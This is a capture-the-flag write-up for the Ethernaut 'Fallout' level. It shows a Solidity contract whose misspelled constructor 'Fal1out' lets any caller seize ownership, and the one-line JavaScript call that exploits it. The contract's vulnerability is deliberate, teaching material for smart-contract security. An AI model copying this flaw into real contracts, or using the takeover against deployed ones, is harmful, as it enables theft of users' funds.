# Fallout

> Claim ownership of the contract below to complete this level.

> Things that might help
> 1. Solidity Remix IDE

```solidity
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public constant returns (uint) {
    return allocations[allocator];
  }
}
```

If you pay enough attention, you'll realize this contract doesn't really have a constructor. The constructor must be named `Fallout`, but it's named `Fal1out`. If the constructor is wrongly named, it becomes a regular method. Regular methods' visibility default to `public`, being part of the contract interface, which means anyone can call it.

So we simply call it:
```javascript
contract.Fal1out()
```

Wait a few seconds and verify you've become the owner:
```javascript
await contract.owner() == player
```

Run it a few times until you see `true`, then submit the instance back to the level. The rest of the contract seems to be purely boilerplate for a very basic "bank" contract, allowing deposits, withdrawals, and a `collectAllocations` backdoor so the owner can collect everyone's savings.
